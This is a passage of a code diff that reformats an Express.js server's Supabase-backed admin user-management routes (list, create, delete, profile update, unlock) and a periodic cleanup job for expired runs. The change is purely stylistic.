+        .in("id", ids)
     : { data: [], error: null };
-  if (securityError) return res.status(500).json({ error: securityError.message });
+  if (securityError)
+    return res.status(500).json({ error: securityError.message });
 
-  const securityById = Object.fromEntries((securityRows || []).map((row) => [row.id, row]));
+  const securityById = Object.fromEntries(
+    (securityRows || []).map((row) => [row.id, row]),
+  );
   res.json({
-    users: users.map((user) => ({ ...user, security: securityById[user.id] || null })),
+    users: users.map((user) => ({
+      ...user,
+      security: securityById[user.id] || null,
+    })),
   });
 });
 
 // POST /proxy/admin/users — create user
 app.post("/proxy/admin/users", requireAuth, requireAdmin, async (req, res) => {
   const { email, password, full_name, plan_id } = req.body;
-  if (!email || !password) return res.status(400).json({ error: "Email and password are required" });
+  if (!email || !password)
+    return res.status(400).json({ error: "Email and password are required" });
 
   const { data, error } = await supabaseAdmin.auth.admin.createUser({
     email,
@@ -656,49 +916,73 @@ app.post("/proxy/admin/users", requireAuth, requireAdmin, async (req, res) => {
   if (error) return res.status(400).json({ error: error.message });
 
   if (full_name || plan_id) {
-    await supabaseAdmin.from("profiles").update({
-      full_name: full_name || null,
-      plan_id:   plan_id   || null,
-    }).eq("id", data.user.id);
+    await supabaseAdmin
+      .from("profiles")
+      .update({
+        full_name: full_name || null,
+        plan_id: plan_id || null,
+      })
+      .eq("id", data.user.id);
   }
 
   res.json({ user: data.user });
 });
 
 // DELETE /proxy/admin/users/:id
-app.delete("/proxy/admin/users/:id", requireAuth, requireAdmin, async (req, res) => {
-  const { id } = req.params;
-  const { error } = await supabaseAdmin.auth.admin.deleteUser(id);
-  if (error) return res.status(400).json({ error: error.message });
-  res.json({ ok: true });
-});
+app.delete(
+  "/proxy/admin/users/:id",
+  requireAuth,
+  requireAdmin,
+  async (req, res) => {
+    const { id } = req.params;
+    const { error } = await supabaseAdmin.auth.admin.deleteUser(id);
+    if (error) return res.status(400).json({ error: error.message });
+    res.json({ ok: true });
+  },
+);
 
 // PATCH /proxy/admin/users/:id/profile — update profile fields
-app.patch("/proxy/admin/users/:id/profile", requireAuth, requireAdmin, async (req, res) => {
-  const { id } = req.params;
-  const { full_name, plan_id, is_admin } = req.body;
-  const update = {};
-  if (full_name  !== undefined) update.full_name = full_name;
-  if (plan_id    !== undefined) update.plan_id   = plan_id;
-  if (is_admin   !== undefined) update.is_admin  = is_admin;
+app.patch(
+  "/proxy/admin/users/:id/profile",
+  requireAuth,
+  requireAdmin,
+  async (req, res) => {
+    const { id } = req.params;
+    const { full_name, plan_id, is_admin } = req.body;
+    const update = {};
+    if (full_name !== undefined) update.full_name = full_name;
+    if (plan_id !== undefined) update.plan_id = plan_id;
+    if (is_admin !== undefined) update.is_admin = is_admin;
 
-  const { error } = await supabaseAdmin.from("profiles").update(update).eq("id", id);
-  if (error) return res.status(400).json({ error: error.message });
-  res.json({ ok: true });
-});
+    const { error } = await supabaseAdmin
+      .from("profiles")
+      .update(update)
+      .eq("id", id);
+    if (error) return res.status(400).json({ error: error.message });
+    res.json({ ok: true });
+  },
+);
 
 // POST /proxy/admin/users/:id/unlock — clear the IP lock and suspension
-app.post("/proxy/admin/users/:id/unlock", requireAuth, requireAdmin, async (req, res) => {
-  const { id } = req.params;
-  const { error } = await supabaseAdmin.from("profiles").update({
-    login_ip: null,
-    is_suspended: false,
-    suspended_at: null,
-    suspended_reason: null,
-  }).eq("id", id);
-  if (error) return res.status(400).json({ error: error.message });
-  res.json({ ok: true });
-});
+app.post(
+  "/proxy/admin/users/:id/unlock",
+  requireAuth,
+  requireAdmin,
+  async (req, res) => {
+    const { id } = req.params;
+    const { error } = await supabaseAdmin
+      .from("profiles")
+      .update({
+        login_ip: null,
+        is_suspended: false,
+        suspended_at: null,
+        suspended_reason: null,
+      })
+      .eq("id", id);
+    if (error) return res.status(400).json({ error: error.message });
+    res.json({ ok: true });
+  },
+);
 
 // ── Server-side auto-expire cleanup (runs every 30 s) ────────────────────────
 async function cleanupExpiredRuns() {
@@ -709,19 +993,23 @@ async function cleanupExpiredRuns() {
         .from(table)
         .select("id, started_at, duration")
         .in("status", ["running", "queued"]);
-      if (error) { console.error(`[cleanup] Failed to fetch ${table}:`, error.message); continue; }
+      if (error) {
+        console.error(`[cleanup] Failed to fetch ${table}:`, error.message);
+        continue;
+      }
       if (!data?.length) continue;
       const expired = data.filter((r) => {
-        const base = r.started_at
-          ? new Date(r.started_at).getTime()
-          : 0; // queued with no started_at — will be caught by the +30s grace in Panel
+        const base = r.started_at ? new Date(r.started_at).getTime() : 0; // queued with no started_at — will be caught by the +30s grace in Panel
         return base > 0 && base + r.duration * 1000 <= Date.now();
       });
       if (expired.length) {
         await Promise.allSettled(
           expired.map((r) =>
-            supabaseAdmin.from(table).update({ status: "success", stopped_at: now }).eq("id", r.id)
-          )
+            supabaseAdmin
+              .from(table)
+              .update({ status: "success", stopped_at: now })
+              .eq("id", r.id),
+          ),
         );
         console.log(`[cleanup] Expired ${expired.length} run(s) in ${table}`);
       }
@@ -733,7 +1021,8 @@ async function cleanupExpiredRuns() {
 // ── Entry point ───────────────────────────────────────────────────────────────
 // When run directly (Replit dev): start the HTTP server + cleanup interval.
 // When imported by Vercel: just export the app — the runtime handles listening.
-const isMain = process.argv[1] && new URL(import.meta.url).pathname === process.argv[1];
+const isMain =
+  process.argv[1] && new URL(import.meta.url).pathname === process.argv[1];
 if (isMain) {
   setInterval(cleanupExpiredRuns, 30_000);
   const PORT = process.env.PORT || 3001;
